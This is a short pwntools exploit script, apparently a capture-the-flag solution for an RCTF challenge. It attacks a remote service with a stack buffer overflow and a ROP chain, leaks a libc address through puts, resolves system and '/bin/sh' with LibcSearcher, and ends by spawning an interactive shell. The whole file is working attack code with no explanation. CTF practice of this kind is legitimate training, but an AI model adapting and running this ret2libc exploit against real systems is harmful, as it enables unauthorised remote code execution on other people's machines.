from pwn import *
from LibcSearcher import *

ru = lambda x:p.recvuntil(x)
sl = lambda x:p.sendline(x)
context.log_level='debug'
#p = process('./1')
p = remote('220.249.52.133','59451')
elf = ELF('./1')

write_got = elf.got['write']
puts_plt = elf.plt['puts']
pop_24 = 0x40089C
pop_rdi = 0x4008A3
main_addr = 0x4007CD

ru('Welcome to RCTF\n')
payload = 'a'*0x18 + p64(pop_24) + p64(pop_rdi) + p64(write_got) + p64(puts_plt) + p64(main_addr)  
sl(payload)
ru('\x40')
write_addr = u64(p.recv(6).ljust(8,'\x00'))
libc = LibcSearcher('write',write_addr)
libc_base = write_addr - libc.dump('write')
system_addr = libc_base + libc.dump('system')
binsh_addr = libc_base + libc.dump('str_bin_sh')
ru('\n')
payload = 'a'*0x18 + p64(pop_24) + p64(pop_rdi) + p64(binsh_addr) + p64(system_addr)
sl(payload)
p.interactive()
